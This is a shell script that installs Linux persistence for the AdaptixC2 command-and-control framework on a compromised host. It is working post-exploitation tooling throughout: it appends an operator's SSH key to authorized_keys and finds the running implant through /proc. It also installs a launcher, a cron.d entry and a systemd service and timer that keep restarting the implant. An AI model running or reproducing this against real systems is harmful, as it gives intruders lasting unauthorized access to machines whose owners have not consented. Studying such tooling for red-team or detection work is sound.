#!/bin/sh
# persist_linux.sh — install Linux persistence for AdaptixC2.
#
# Designed for one-click use: every argument is optional and has a sensible
# default, so the operator normally runs it with no arguments at all.
#
# Usage:
#   persist_linux.sh [--method all|sshkey|cron|systemd|list]
#                    [--agent-pid PID] [--key "<authorized_keys line>"]
#                    [--key-b64 "<base64 of that line>"]
#                    [--schedule "<5-field cron or 0_*_*_*_*>"] [--command "<cmd>"]
#                    [--user NAME] [--name NAME] [--interval SECONDS]
#
# Defaults:
#   --method all        install the SSH key and an hourly cron entry
#   --schedule          "0 * * * *" (every 60 minutes)
#   --command           resolved from --agent-pid: the running agent's own
#                       executable, so persistence relaunches the SAME payload
#                       that is already deployed
#   --name              adaptix-persist
#
# Every launcher the script installs first checks whether the agent is already
# running and exits when it is, so a live session never gets a duplicate.
# All artifacts carry the marker below so cleanup_persistence.sh removes
# exactly what this script created.

set -u

MARKER="adaptix-persist"
DEFAULT_NAME="adaptix-persist"
DEFAULT_SCHEDULE="0 * * * *"
CRON_DIR="/etc/cron.d"
SYSTEMD_DIR="/etc/systemd/system"
LAUNCHER_DIR="/usr/local/bin"

METHOD="all"
USER_NAME=""
KEY=""
KEY_B64=""
SCHEDULE=""
COMMAND=""
NAME="$DEFAULT_NAME"
INTERVAL=3600
AGENT_PID=""

log()  { printf '[persist] %s\n' "$*"; }
fail() { printf '[persist] ERROR: %s\n' "$*" >&2; exit 1; }

while [ $# -gt 0 ]; do
    case "$1" in
        --method)    METHOD="${2:-}"; shift 2 ;;
        --user)      USER_NAME="${2:-}"; shift 2 ;;
        --key)       KEY="${2:-}"; shift 2 ;;
        --key-b64)   KEY_B64="${2:-}"; shift 2 ;;
        --schedule)  SCHEDULE="${2:-}"; shift 2 ;;
        --command)   COMMAND="${2:-}"; shift 2 ;;
        --name)      NAME="${2:-}"; shift 2 ;;
        --interval)  INTERVAL="${2:-}"; shift 2 ;;
        --agent-pid) AGENT_PID="${2:-}"; shift 2 ;;
        --help|-h)   sed -n '2,26p' "$0"; exit 0 ;;
        *)           fail "unknown argument: $1" ;;
    esac
done

if [ -n "$KEY_B64" ]; then
    KEY=$(printf '%s' "$KEY_B64" | base64 -d 2>/dev/null)
    [ -n "$KEY" ] || fail "cannot decode --key-b64"
fi

if [ -z "$USER_NAME" ]; then
    USER_NAME="$(id -un 2>/dev/null || echo root)"
fi

HOME_DIR=""
if [ "$USER_NAME" = "root" ]; then
    HOME_DIR="${HOME:-/root}"
else
    HOME_DIR="$(getent passwd "$USER_NAME" 2>/dev/null | cut -d: -f6)"
    [ -n "$HOME_DIR" ] || fail "cannot resolve home directory for user '$USER_NAME'"
fi

# Resolve the agent's own executable when no command was supplied. This keeps
# persistence pointing at the payload that is already on the host.
if [ -z "$COMMAND" ] && [ -n "$AGENT_PID" ]; then
    if [ -e "/proc/$AGENT_PID/exe" ]; then
        COMMAND="$(readlink -f "/proc/$AGENT_PID/exe" 2>/dev/null)"
        log "resolved agent executable from pid $AGENT_PID: ${COMMAND:-unknown}"
    else
        log "pid $AGENT_PID is gone, cannot resolve the agent executable"
    fi
fi

# The agent's "run" argument string loses shell quoting, so a cron schedule
# may arrive with underscores instead of spaces (0_*_*_*_*).
if [ -n "$SCHEDULE" ]; then
    SCHEDULE=$(printf '%s' "$SCHEDULE" | tr '_' ' ')
fi
if [ -z "$SCHEDULE" ]; then
    SCHEDULE="$DEFAULT_SCHEDULE"
fi

# The launcher guarantees "do not start a second copy while one is running".
write_launcher() {
    launcher="$LAUNCHER_DIR/$NAME.run"
    mkdir -p "$LAUNCHER_DIR" || fail "cannot create $LAUNCHER_DIR"

    cat > "$launcher" <<EOF
#!/bin/sh
# $MARKER $NAME
EXE="$COMMAND"
[ -n "\$EXE" ] || exit 0
[ -x "\$EXE" ] || exit 0
if pgrep -f "\$EXE" >/dev/null 2>&1; then
    exit 0
fi
exec "\$EXE" >/dev/null 2>&1
EOF

    chmod 755 "$launcher" || fail "cannot chmod $launcher"
    log "launcher written: $launcher"
}

do_sshkey() {
    [ -n "$KEY" ] || fail "sshkey requires a public key (the teamserver injects one automatically)"

    SSH_DIR="$HOME_DIR/.ssh"
    KEYS_FILE="$SSH_DIR/authorized_keys"

    mkdir -p "$SSH_DIR" || fail "cannot create $SSH_DIR"
    chmod 700 "$SSH_DIR"

    if [ -f "$KEYS_FILE" ] && grep -qF -- "$KEY" "$KEYS_FILE"; then
        log "key already present in $KEYS_FILE"
    else
        printf '%s\n' "$KEY" >> "$KEYS_FILE" || fail "cannot write $KEYS_FILE"
        log "key installed in $KEYS_FILE"
    fi
    chmod 600 "$KEYS_FILE"

    if ! grep -qF -- "$MARKER" "$KEYS_FILE"; then
        printf '# %s\n' "$MARKER" >> "$KEYS_FILE"
        chmod 600 "$KEYS_FILE"
    fi
}

do_cron() {
    [ -n "$COMMAND" ] || fail "cron requires a command (pass --agent-pid or --command)"

    set -f
    set -- $SCHEDULE
    set +f
    [ $# -eq 5 ] || fail "cron schedule must have 5 fields"

    [ -d "$CRON_DIR" ] || fail "cron directory $CRON_DIR not present"

    write_launcher

    CRON_FILE="$CRON_DIR/$NAME"
    {
        printf '# %s %s\n' "$MARKER" "$NAME"
        printf '%s %s %s\n' "$SCHEDULE" "$USER_NAME" "$LAUNCHER_DIR/$NAME.run"
    } > "$CRON_FILE" || fail "cannot write $CRON_FILE"
    chmod 644 "$CRON_FILE"

    log "cron entry installed in $CRON_FILE ($SCHEDULE)"
}

do_systemd() {
    [ -n "$COMMAND" ] || fail "systemd requires a command (pass --agent-pid or --command)"

    [ "$INTERVAL" -ge 60 ] 2>/dev/null || INTERVAL=3600

    [ -d "$SYSTEMD_DIR" ] || fail "systemd directory $SYSTEMD_DIR not present"

    write_launcher

    UNIT_FILE="$SYSTEMD_DIR/$NAME.service"
    TIMER_FILE="$SYSTEMD_DIR/$NAME.timer"

    cat > "$UNIT_FILE" <<EOF
# $MARKER $NAME
[Unit]
Description=AdaptixC2 persistence unit ($NAME)

[Service]
Type=oneshot
ExecStart=$LAUNCHER_DIR/$NAME.run
EOF

    cat > "$TIMER_FILE" <<EOF
# $MARKER $NAME
[Unit]
Description=AdaptixC2 persistence timer ($NAME)

[Timer]
OnBootSec=120s
OnUnitActiveSec=${INTERVAL}s
AccuracySec=1s
Unit=$NAME.service

[Install]
WantedBy=timers.target
EOF

    chmod 644 "$UNIT_FILE" "$TIMER_FILE"

    if command -v systemctl >/dev/null 2>&1; then
        systemctl daemon-reload || fail "systemctl daemon-reload failed"
        systemctl enable --now "$NAME.timer" || fail "failed to enable timer"
        log "timer enabled: $(systemctl is-enabled "$NAME.timer" 2>/dev/null || echo unknown)"
    else
        log "systemctl not available, unit files written only"
    fi

    log "systemd unit installed ($UNIT_FILE, $TIMER_FILE)"
}

do_list() {
    log "authorized_keys entries tagged '$MARKER':"
    if [ -f "$HOME_DIR/.ssh/authorized_keys" ]; then
        grep -n -- "$MARKER" "$HOME_DIR/.ssh/authorized_keys" 2>/dev/null || log "  (none)"
    else
        log "  (no authorized_keys file)"
    fi

    log "cron entries tagged '$MARKER':"
    if [ -d "$CRON_DIR" ]; then
        found=0
        for f in "$CRON_DIR"/*; do
            [ -f "$f" ] || continue
            if grep -q -- "$MARKER" "$f" 2>/dev/null; then
                log "  $f"
                found=1
            fi
        done
        [ $found -eq 1 ] || log "  (none)"
    fi

    log "systemd units tagged '$MARKER':"
    if [ -d "$SYSTEMD_DIR" ]; then
        found=0
        for f in "$SYSTEMD_DIR"/*.service "$SYSTEMD_DIR"/*.timer; do
            [ -f "$f" ] || continue
            if grep -q -- "$MARKER" "$f" 2>/dev/null; then
                log "  $f"
                found=1
            fi
        done
        [ $found -eq 1 ] || log "  (none)"
    fi

    log "launchers tagged '$MARKER':"
    found=0
    for f in "$LAUNCHER_DIR"/*.run; do
        [ -f "$f" ] || continue
        if grep -q -- "$MARKER" "$f" 2>/dev/null; then
            log "  $f"
            found=1
        fi
    done
    [ $found -eq 1 ] || log "  (none)"
}

case "$METHOD" in
    all)
        if [ -n "$KEY" ]; then
            do_sshkey
        else
            log "no SSH key supplied, skipping the SSH key step"
        fi
        do_cron
        ;;
    sshkey)  do_sshkey ;;
    cron)    do_cron ;;
    systemd) do_systemd ;;
    list)    do_list ;;
    *)       fail "unknown method '$METHOD' (all|sshkey|cron|systemd|list)" ;;
esac

log "done"
exit 0
